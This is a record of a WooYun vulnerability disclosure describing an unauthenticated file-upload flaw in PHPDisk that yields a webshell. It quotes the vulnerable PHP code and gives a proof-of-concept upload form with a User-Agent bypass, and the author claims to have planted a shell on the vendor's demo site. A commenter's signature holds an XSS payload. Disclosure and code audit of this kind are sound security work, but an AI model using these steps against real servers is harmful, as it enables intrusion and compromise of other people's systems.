{"id": 1666, "wybug_id": "wooyun-2014-063222", "wybug_title": "phpdisk任意文件上传getshell(官网已shell)", "wybug_corp": "phpdisk.com", "wybug_author": "phith0n", "wybug_date": "2014-06-03 12:20", "wybug_open_date": "2014-09-01 12:22", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "源码审计"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-01：\t细节向公众公开  简要描述： M老师指哪个cms，我就打哪个cms~真是幸福~~无需登录，无需权限，直接getshell。 详细说明：  上传位置在plugins/phpdisk_client/client_sub.php首先验证user-agent，然后从解密字符串里拿到了一个用户名和密码：\ninclude \"../../includes/commons.inc.php\";@set_time_limit(0);$agent = $_SERVER['HTTP_USER_AGENT'];if($agent!='phpdisk-client'){\texit('<a href=\"http://faq.phpdisk.com/search?w=p403&err=code\" target=\"_blank\">[PHPDisk Access Deny] Invalid Entry!</a>');}$u_info = trim(gpc('u_info','P',''));parse_str(pd_encode(base64_decode($u_info),'DECODE'));// checked username and pwd.../*$username = trim(gpc('username','GP',''));$password = trim(gpc('password','GP',''));*/$username = is_utf8() ? $username : convert_str('utf-8','gbk',$username);$password = is_utf8() ? $password : convert_str('utf-8','gbk',$password);$userinfo = $db->fetch_one_array(\"select userid from {$tpf}users where username='$username' and password='$password'\");if(!$userinfo){\t$str = '网盘登录出错：用户名或密码不正确，请重新输入';\t$str = is_utf8() ? convert_str('utf-8','gbk',$str) : $str;\techo $str;}else{\t$uid = (int)$userinfo[userid];}\n拿到用户名和密码以后，进入数据库查询，但查询出错后echo出来“网盘登录出错：用户名或密码不正确，请重新输入”并没退出。这个就没有用了，不需要知道加密字符串，也不用登陆。所以继续往下看，\nswitch ($action){\tcase 'upload_file':\t\t//write_file(PHPDISK_ROOT.'system/2.txt',var_export($_POST,true));\t\t//write_file(PHPDISK_ROOT.'system/3.txt',var_export($_FILES,true));\t\t$file = $_FILES['file1'];\t\t$file_name = trim(gpc('file_name','P',''));\t\t$file_do_name = trim(gpc('file_do_name','P',''));\t\t$file_local_path = trim(gpc('file_local_path','P',''));\t\t$folder_id = (int)gpc('folder_id','P',0);\t\t$file_size = (int)gpc('file_size','P',0);\t\t$file_parts = (int)gpc('file_parts','P',0);\t\t$tmp_dir = PHPDISK_ROOT.'system/cache/';\t\tmake_dir($tmp_dir);\t\t$file_local_path = is_utf8() ? convert_str('gbk','utf-8',$file_local_path) : $file_local_path;\t\t$file_do_name = is_utf8() ? convert_str('gbk','utf-8',$file_do_name) : $file_do_name;\t\t$file_name = is_utf8() ? convert_str('gbk','utf-8',$file_name) : $file_name;\t\tif(upload_file($file['tmp_name'],$tmp_dir.$file[name])){\t\t\t//insert db\n进入case以后调用upload_file上传，文件名就直接用的$file[name]。跟一下upload_file看看：\nfunction upload_file($source, $target) {\tif (function_exists('move_uploaded_file') && @move_uploaded_file($source, $target)) {\t\t@chmod($target, 0666);\t\treturn $target;\t} elseif (@copy($source, $target)) {\t\t@chmod($target, 0666);\t\treturn $target;\t} elseif (@is_readable($source)) {\t\tif ($fp = @fopen($source,'rb')) {\t\t\t@flock($fp,2);\t\t\t$filedata = @fread($fp,@filesize($source));\t\t\t@fclose($fp);\t\t}\t\tif ($fp = @fopen($target, 'wb')) {\t\t\t@flock($fp, 2);\t\t\t@fwrite($fp, $filedata);\t\t\t@fclose($fp);\t\t\t@chmod ($target, 0666);\t\t\treturn $target;\t\t} else {\t\t\treturn false;\t\t}\t}}\n没有验证。直接拷贝进去了。虽然case那块后面有个unlink对上传的文件进行删除，不过因为之后有一处数据库查询失败，导致这个unlink没有执行。（应该是，我没细看，反正没执行，我的shell没被删）利用详见漏洞证明。   漏洞证明：  本地构造一个上传单页：\n<form name=\"form\" method=\"post\" action=\"http://demo.phpdisk.com/v/plugins/phpdisk_client/client_sub.php?action=file_upload\" enctype=\"multipart/form-data\" ><input type=\"hidden\" name=\"file_name\" value=\"aaa.gif\"><input type=\"file\" name=\"file1\"><input type=\"submit\" name=\"Submit\" value=\"上传\" ></form>\n选择shell上传，中途抓包。改user-agent为“phpdisk-client”，不改不能上传。发送。返回包是这样的：\n\n这个时候查看/system/cache/即可看到shell：\n\n官网demo站shell已拿下：http://demo.phpdisk.com/v/system/cache/info.phpps.我看到有前辈的phpinfo了，呵呵。。。前辈们果然都手握0day   修复方案：  你猜~   版权声明：转载请注明来源 phith0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-06-03 19:59 厂商回复： 感谢反馈 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-03 12:35 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  M老师是谁？    \n     2014-06-03 14:09 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  对于没上首页这件事，我感觉很失望……    \n     2014-06-03 14:47 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  @Mody 我俩共同的老湿 @Mramydnei M老师    \n     2014-06-03 15:47 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  @phith0n @索马里的海贼 求拜祖师爷@Mramydnei     \n     2014-06-03 22:52 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  你们那么NB家里人知道吗？    \n     2014-06-05 22:14 |    \t\tAngelic47 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        )\t\t \n  还好我早就不用phpdisk了= =    \n     2014-06-07 03:31 |    \t\tMy5t3ry \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        )\t\t \n  目测和我4月份这个一样http://loudong.360.cn/vul/info/id/5596官方竟然没出补丁。。。    \n     2014-06-07 15:17 |    \t\t孩子他爸 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:15        | xxoo)\t\t \n  楼主你太NB了    \n     2014-06-07 16:58 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  @My5t3ry 我说那个phpinfo谁留的。。。    \n     2014-06-07 23:53 |    \t\tMy5t3ry \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        )\t\t \n  @phith0n 哈哈    \n     2014-06-08 13:25 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  补丁已绕过。。。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}